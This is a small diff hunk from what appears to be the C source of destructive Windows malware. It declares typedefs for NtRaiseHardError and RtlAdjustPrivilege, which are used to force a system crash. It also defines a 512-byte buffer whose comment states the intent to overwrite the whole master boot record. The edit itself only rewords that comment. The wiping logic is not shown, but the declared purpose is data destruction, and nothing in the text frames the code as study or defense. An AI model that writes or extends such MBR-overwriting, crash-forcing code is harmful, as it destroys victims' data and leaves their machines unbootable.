@@ -10,7 +10,7 @@
 
 typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-#define BUFF_SIZE 512 //size of our data will be 512 coz MBR has 512 bytes and we want to overwrite all of its bytes.
+#define BUFF_SIZE 512 //size of our data will be 512 coz MBR has 512 bytes and I want to overwrite all of its bytes.
 
 void lol()
 {
